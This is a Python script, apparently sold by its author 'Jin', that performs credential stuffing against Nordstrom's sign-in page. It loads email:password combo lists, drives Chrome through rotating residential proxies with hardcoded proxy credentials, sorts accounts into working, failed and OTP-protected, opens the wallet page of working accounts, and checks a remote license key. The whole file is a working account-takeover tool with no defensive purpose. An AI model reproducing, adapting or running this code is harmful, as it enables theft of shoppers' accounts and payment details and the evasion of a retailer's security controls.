import base64
import ctypes
import os
import random
import urllib.request
import zipfile
from multiprocessing import Lock
from multiprocessing.dummy import Pool
from os import _exit
from random import choice
from time import sleep
from datetime import datetime

import requests
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException

init()

bad = 0
good = 0
loaded = 0
errors = 0
checked = 0

lock = Lock()


class checker(object):
    def __init__(self, combo_location):
        self.combo_l = combo_location
        self.combo_list = []

    def validAcc(self, mail, passw):
        global checked, good, loaded
        print(Fore.LIGHTGREEN_EX + "Login Success with Email: {} & Password: {}".format(mail, passw))
        good += 1
        checked += 1
        lock.acquire()
        f = open("LIVE.txt", "a+")
        f.write("LIVE - Checked by Jin - Nordstrom Checker|{}|{}\n".format(mail, passw))
        f.close()
        lock.release()

    def invalidAcc(self, mail, passw):
        global checked, bad, loaded
        print(Fore.LIGHTRED_EX + "Login Failed with Email: {} & Password: {}".format(mail, passw))
        checked += 1
        bad += 1
        lock.acquire()
        f = open("DIE.txt", "a+")
        f.write("DIE - Checked by Jin - Nordstrom Checker|{}|{}\n".format(mail, passw))
        f.close()
        lock.release()

    def invalidAccUnknown(self, mail, passw):
        global checked, bad, loaded
        print(Fore.LIGHTRED_EX + "Acconut forbidden, need to recheck with other proxy. Email: {} & Password: {}".format(mail, passw))
        checked += 1
        bad += 1
        lock.acquire()
        f = open("RecheckThis.txt", "a+")
        f.write("Recheck This with other proxy - Checked by Jin - Nordstrom Checker|{}|{}\n".format(mail, passw))
        f.close()
        lock.release()

    def hide_file(self, filename):
        import win32file
        import win32con
        import win32api
        flags = win32file.GetFileAttributesW(filename)
        win32file.SetFileAttributes(filename,
                                    win32con.FILE_ATTRIBUTE_HIDDEN | flags)

    def show_file(self, filename):
        import win32file
        import win32con
        import win32api
        flags = win32file.GetFileAttributesW(filename)
        win32file.SetFileAttributes(filename,
                                    win32con.FILE_ATTRIBUTE_NORMAL | flags)

    def get_chromedriver(self, use_proxy=False):
        username = 'lum-customer-hl_323d7dae-zone-static-route_err-pass_dyn'
        password = 'sfch4fj8m3r9'
        port = 22225
        session_id = random.random()
        super_proxy_url = ('http://%s-country-us-session-%s:%s@zproxy.lum-superproxy.io:%d' %
                           (username, session_id, password, port))
        proxy_handler = urllib.request.ProxyHandler({
            'http': super_proxy_url,
            'https': super_proxy_url,
        })

        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = \
            [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
        #print('Performing request')
        # print(opener.open('http://lumtest.com/myip.json').read())
        #print("This is super URL " + super_proxy_url + "\n")
        split = super_proxy_url.split(":")
        username_proxy = split[1].replace("//", "")
        password_proxy = split[2].rsplit("@")
        realpwd = password_proxy[0]
        ip_proxy = password_proxy[1]
        port_proxy = split[-1]

        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                },
                bypassList: ["localhost"]
                }
            };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (ip_proxy, port_proxy, username_proxy, realpwd)
        path = os.path.dirname(os.path.abspath(__file__))
        chrome_options = webdriver.ChromeOptions()
        if use_proxy == True:
            pluginfile = 'auth.zip'

            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js)
            chrome_options.add_extension(pluginfile)
            self.hide_file(pluginfile)
            chrome_options.add_experimental_option(
                'excludeSwitches', ['enable-logging'])
        driver = webdriver.Chrome(
            os.path.join(path, 'chromedriver'),
            options=chrome_options)
        os.remove(pluginfile)  # remove for change IP per thread
        return driver

    def checker_main(self, email, password):
        global loaded, good, bad, checked, errors
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Nordstrom Checker by Jin - Checked: {checked} Good: {good} Bad: {bad} Timeout: {errors}")
        while True:
            try:
                #options = webdriver.ChromeOptions()
                #options.add_experimental_option('excludeSwitches', ['enable-logging'])
                # options.add_argument("headless")
                #driver = webdriver.Chrome(options=options)
                driver = self.get_chromedriver(use_proxy=True)
                driver.set_page_load_timeout(60)
                driver.get("https://secure.nordstrom.com/signin")
                assert "Nordstrom" in driver.title
                driver.refresh()
                sleep(3)
                driver.find_element_by_xpath('//*[@id="sign-in"]/label/div/input').send_keys(email)
                sleep(1)
                print(Fore.LIGHTMAGENTA_EX + "Checking login for Email: {} & Password: {}".format(email, password))
                driver.find_element_by_xpath('//*[@id="sign-in"]/div[1]/label/div/input').send_keys(password)
                sleep(1)
                driver.find_element_by_xpath('//*[@id="sign-in"]/div[1]/label/div/input').send_keys("\ue007")
                sleep(5)
                if """Your email or password wasn’t recognized.""" in driver.page_source:
                    self.invalidAcc(email,password)
                    driver.quit()
                elif """account-forbidden""" in driver.current_url:
                    self.invalidAccUnknown(email,password)
                    driver.quit()
                #elif """In Store: Shoes, Jewelry, Clothing, Makeup, Dresses""" in driver.page_source:
                elif """Nordstrom Your Account""" in driver.page_source:
                    driver.get('https://secure.nordstrom.com/my-account/wallet')
                    self.validAcc(email,password)
                    print("Checking card...")
                    driver.quit()
                else:
                    checkOTP = """if (document.querySelectorAll("p")[0].textContent == 'To help keep your account safe from unwanted access, we’ll send you a code to verify.') {
                        document.title = 'Check OTP';
                    }"""
                    #print(checkOTP)
                    driver.execute_script(checkOTP)
                    print(Fore.LIGHTRED_EX + "Login Success with Email: {} & Password: {}".format(email, password))
                    checked += 1
                    good += 1
                    f = open("LIVE.txt", "a+")
                    f.write("LIVE But OTP - Checked by Jin - Nordstrom Checker|{}|{}\n".format(email, password))
                    f.close()
                    driver.quit()
                break
            except TimeoutException:
                errors += 1
                driver.quit()
                continue

    def combo_loader(self):
        _combo_ = open(self.combo_l, "r").readlines()
        _combo_fresh = [items.rstrip() for items in _combo_]
        for lines in _combo_fresh:
            new_lines = lines.split(":")
            self.combo_list.append({"email": new_lines[0],
                                    "password": new_lines[-1]})

    def sender(self, list_accounts):
        email = list_accounts["email"]
        password = list_accounts["password"]
        while True:
            try:
                self.checker_main(email, password)
                break
            except Exception:
                pass

    def threads(self):
        self.combo_loader()
        self.threads = 5
        pool = Pool(self.threads)
        try:
            for _ in pool.imap_unordered(self.sender, self.combo_list):
                pass
        except KeyboardInterrupt:
            os.system('taskkill /f /im chrome.exe')
            _exit(0)

        print("Done!")
        print("Thank you for using Nordstrom Checker!")


if __name__ == "__main__":
    try:
        os.remove("auth.zip")
    except:
        pass
    ctypes.windll.kernel32.SetConsoleTitleW(
        "Nordstrom Checker by {}".format('Jin'))
    print(Fore.LIGHTCYAN_EX+"Nordstrom Private Checker by Jin")
    print("")
    print("Please enter Key below...")
    while True:
        keyCheck = requests.get('https://rgunz.net/captcha/amz.txt')
        keyCheck_final = keyCheck.text.splitlines()
        _key = "chinxcuto"  # input("Key : ")
        if _key in keyCheck_final:
            combo_name = "nord.txt"  # input("Combo Name: ")
            print(Fore.LIGHTCYAN_EX + "I'm Processing using Luminati...Please wait")
            checker(combo_name).threads()
            break
        else:
            print("Invalid Key. Please contact Jin to buy or try again !!!")
            continue
